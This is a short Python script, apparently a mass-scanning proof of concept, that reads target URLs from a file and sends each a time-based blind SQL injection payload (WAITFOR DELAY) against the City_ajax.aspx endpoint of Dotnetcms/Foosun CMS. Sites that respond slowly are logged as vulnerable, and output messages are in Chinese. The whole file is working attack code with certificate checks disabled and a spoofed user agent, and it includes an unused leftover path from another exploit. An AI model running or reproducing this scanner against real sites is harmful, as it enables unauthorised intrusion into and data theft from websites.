import sys
import time
import requests
import warnings

urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/user/City_ajax.aspx?CityId=1%27WAiTFoR%20DeLAy%20%270:0:6%27--"
    vulnurl = url + payload
    start_time = time.time()
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if time.time() - start_time >= 6:
            print("[+]存在Dotnetcms(风讯cms)SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在foosun_City_ajax_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")


